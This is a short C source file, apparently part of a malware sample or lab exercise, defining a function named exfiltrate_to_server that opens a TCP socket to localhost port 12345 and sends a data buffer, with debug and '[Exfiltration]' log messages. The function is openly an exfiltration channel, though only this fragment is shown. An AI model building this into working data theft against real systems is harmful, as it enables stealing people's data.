#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

void exfiltrate_to_server(const char *data, size_t size) {
    printf("[Debug] exfiltrate_to_server called with %zu bytes\n", size);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("[Exfiltration] Socket creation failed");
        return;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(12345);
    inet_pton(AF_INET, "127.0.0.1", &server.sin_addr);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("[Exfiltration] Connection to server failed");
        close(sock);
        return;
    }

    if (send(sock, data, size, 0) < 0) {
        perror("[Exfiltration] Sending data failed");
    } else {
        printf("[Exfiltration] Data sent successfully: %.*s\n", (int)size, data);
    }

    close(sock);
}
